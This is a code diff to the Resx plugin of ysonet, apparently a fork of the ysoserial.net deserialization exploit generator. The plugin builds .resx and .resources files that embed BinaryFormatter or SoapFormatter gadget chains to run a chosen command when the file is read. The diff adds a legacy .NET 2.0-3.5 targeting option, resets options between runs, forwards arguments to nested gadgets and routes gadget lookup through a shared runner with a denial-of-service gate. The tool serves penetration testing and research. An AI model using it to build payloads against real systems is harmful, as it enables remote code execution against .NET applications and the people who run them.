@@ -16,8 +16,8 @@ using ysonet.Helpers;
  *  .RESX file can be compiled to .RESOURCE using the `resgen.exe payload.resx` command.
  * 
  * Original references: 
- *  https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
- *  https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
+ *  https://soroush.me/blog/asp-net-resource-files-resx-and-deserialization-issues
+ *  https://soroush.me/downloadable/aspnet_resource_files_resx_deserialization_issues.pdf
  **/
 
 namespace ysonet.Plugins
@@ -36,6 +36,7 @@ namespace ysonet.Plugins
         static bool useSimpleType = true;
         static bool rawcmd = false;
         static bool dosAcknowledged = false;
+        static bool legacyFx = false;
 
         static OptionSet options = new OptionSet()
             {
@@ -50,6 +51,7 @@ namespace ysonet.Plugins
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                 {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
+                {"legacyfx", "Target the .NET Framework 2.0/3.0/3.5 (CLR v2) generation. This reaches the GADGET only. The .resx reader/writer headers remain at 4.0.0.0 because ResXResourceReader treats them as descriptive metadata; the complete document is tested on CLR v2. Default: false", v => legacyFx = v != null },
                 {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
             };
 
@@ -77,6 +79,31 @@ namespace ysonet.Plugins
         // A public plugin: it is listed everywhere, with or without --display-private.
         public bool IsPrivate() { return false; }
 
+        // Measured at BOTH ends: the LEGACY tier fires this plugin on real CLR-v2 children
+        // (2.0/3.0/3.5 lanes, raw and minified), and the execution matrix observes it on
+        // this machine's 4.8.1 build.
+        //
+        // Declared as a CONTIGUOUS range rather than just those endpoints, and that is a
+        // correctness point rather than a style one. A HOLE inside a declared span is not
+        // "unmeasured", it is an active EXCLUSION: ClassifyVersionEvidence returns
+        // Contradiction for an observation inside the hole, and its own unit test spells
+        // that out ("the gadget positively says it does not work there"). So declaring
+        // {2.0,3.0,3.5,4.8.1} would FAIL the suite on any 4.0-4.8 machine the moment the
+        // execution matrix fired this plugin there - a red build for a contributor whose
+        // box is 4.8 rather than 4.8.1, reporting a claim that was never intended.
+        //
+        // ObjRef and TempFileCollection carry the identical evidence shape (CLR-v2 lanes
+        // plus 4.8.1) and both declare Range(NetFx20, NetFx481) for the same reason.
+        // The legacy runs also establish that this plugin's own 4.0 reader/writer
+        // resheaders are descriptive metadata: a CLR-2 ResXResourceReader accepted the
+        // document and loaded System.Windows.Forms 2.0.0.0, so no CLR-2 template variant
+        // is needed.
+        public List<string> RuntimeVersions()
+        {
+            return new List<string>(RuntimeVersion.Range(
+                RuntimeVersion.NetFx20, RuntimeVersion.NetFx481));
+        }
+
         public OptionSet Options()
         {
             return options;
@@ -88,11 +115,26 @@ namespace ysonet.Plugins
             List<string> extra;
 
             // The option set writes into statics, so a second run in the same process would
-            // inherit the first one's values. Clear the two file-reference options before
-            // parsing, so a run without --type really is the documented default run - the
-            // interactive editor drives a plugin repeatedly in one process.
+            // inherit the first one's values. Clear EVERY option before parsing, so a run
+            // without a flag really is the documented default run - the interactive editor
+            // and the test suite both drive a plugin repeatedly in one process.
+            //
+            // This used to clear only the two file-reference options. That left -g in
+            // particular sticking, because gadget_name is defaulted below only when it is
+            // blank: a second run without -g silently reused the first run's gadget.
+            mode = "";
+            file = "";
             filerefType = "";
             filerefEncoding = "";
+            command = "";
+            gadget_name = "";
+            outputfile = "";
+            test = false;
+            minify = false;
+            useSimpleType = true;
+            rawcmd = false;
+            dosAcknowledged = false;
+            legacyFx = false;
 
             try
             {
@@ -103,6 +145,13 @@ namespace ysonet.Plugins
                 inputArgs.IsRawCmd = rawcmd;
                 inputArgs.Test = test;
                 inputArgs.DosAcknowledged = dosAcknowledged;
+                // Reaches the inner gadget's generation boundary only. The reader/writer
+                // headers are descriptive metadata and are accepted by the CLR-v2 reader.
+                inputArgs.LegacyFx = legacyFx;
+                // Anything this plugin did not recognise belongs to the gadget the user
+                // chose with -g, so it is forwarded rather than dropped. Only the LEFTOVER
+                // args travel: an option this plugin declares was already consumed above.
+                inputArgs.ExtraArguments = extra;
             }
             catch (OptionException e)
             {
@@ -250,51 +299,21 @@ namespace ysonet.Plugins
                 case "compileddotresources":
                     if (!String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                     {
-                        var types = Helpers.AssemblyTypeScanner.SafeGetAllTypes();
-                        var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface && !p.AssemblyQualifiedName.Contains("Helpers.TestingArena"));
-                        var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList().OrderBy(s => s, StringComparer.OrdinalIgnoreCase);
-
-                        if (!generators.Contains(gadget_name, StringComparer.CurrentCultureIgnoreCase))
-                        {
-                            Console.WriteLine("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
-                            throw new Exception("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
-                        }
-
                         string formatter_name = "binaryformatter"; // this is what we need here
+                        InputArgs innerArgs = inputArgs.DeepCopy();
+                        // -t belongs to the ResX consumer below. The nested gadget must not
+                        // self-test first or one invocation can fire twice.
+                        innerArgs.Test = false;
 
-                        // Instantiate Payload Generator
-                        IGenerator generator = null;
-                        try
+                        // The shared resolver owns the name lookup, the denial-of-service
+                        // gate (refused BEFORE the formatter check) and the formatter
+                        // check. It replaced a hand-built type name passed to
+                        // Activator.CreateInstance, which could not resolve a gadget
+                        // outside ysonet.Generators.
+                        Helpers.Core.RunResult gadgetResult =
+                            Helpers.Core.PayloadRunner.GeneratePluginGadget(
+                                gadget_name, formatter_name, innerArgs);
                         {
-                            gadget_name = generators.Where(p => String.Equals(p, gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
-                            var container = Activator.CreateInstance(null, "ysonet.Generators." + gadget_name + "Generator");
-                            generator = (IGenerator)container.Unwrap();
-                        }
-                        catch
-                        {
-                            Console.WriteLine("Gadget not supported!");
-                            throw new Exception("Gadget not supported!");
-                        }
-
-                        // A denial-of-service gadget is refused before the formatter
-                        // check, so the reason a user sees is always the missing
-                        // acknowledgement rather than an unrelated incompatibility.
-                        string dosRefusal = Helpers.Core.DosPolicy.RefusalIfUnacknowledged(
-                            gadget_name, inputArgs.DosAcknowledged);
-                        if (!string.IsNullOrEmpty(dosRefusal))
-                        {
-                            Console.WriteLine(dosRefusal);
-                            throw new Exception(dosRefusal);
-                        }
-
-                        // Check Generator supports specified formatter
-                        if (generator.IsSupported(formatter_name))
-                        {
-                            // A user-selected gadget goes through the shared runner,
-                            // never Generate* directly, so the DoS policy and its
-                            // warning are the same here as on the command line.
-                            Helpers.Core.RunResult gadgetResult =
-                                Helpers.Core.PayloadRunner.GenerateSelectedGadget(generator, formatter_name, inputArgs);
                             if (!gadgetResult.Success)
                             {
                                 Console.WriteLine(gadgetResult.ErrorMessage);
@@ -328,27 +347,24 @@ namespace ysonet.Plugins
                             }
 
                         }
-                        else
-                        {
-                            Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
-                            throw new Exception("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
-                        }
-
-
-
-
                     }
                     break;
                 case "soapformatter":
                     mtype = @"mimetype=""text/microsoft-urt/soap-serialized/base64""";
                     if (!String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().GenerateInner("SoapFormatter", inputArgs);
+                        InputArgs innerArgs = inputArgs.DeepCopy();
+                        innerArgs.Test = false;
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator()
+                            .GenerateInner("SoapFormatter", innerArgs);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     else
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().GenerateInner("SoapFormatter", inputArgs);
+                        InputArgs innerArgs = inputArgs.DeepCopy();
+                        innerArgs.Test = false;
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator()
+                            .GenerateInner("SoapFormatter", innerArgs);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     break;
@@ -380,14 +396,20 @@ namespace ysonet.Plugins
                     {
                         using (TextReader sr = new StringReader(payload))
                         {
-                            var foo = new ResXResourceReader(sr);
-                            if (mode.ToLower() != "binaryformatter")
-                                foo.GetEnumerator();
+                            using (var resources = new ResXResourceReader(sr))
+                            {
+                                var values = resources.GetEnumerator();
+                                values.MoveNext();
+                            }
                         }
                     }
                     else
                     {
-                        ResourceSet myResourceSet = new ResourceSet(outputfile);
+                        using (ResourceSet resources = new ResourceSet(outputfile))
+                        {
+                            var values = resources.GetEnumerator();
+                            values.MoveNext();
+                        }
                     }
                 }
                 catch { }
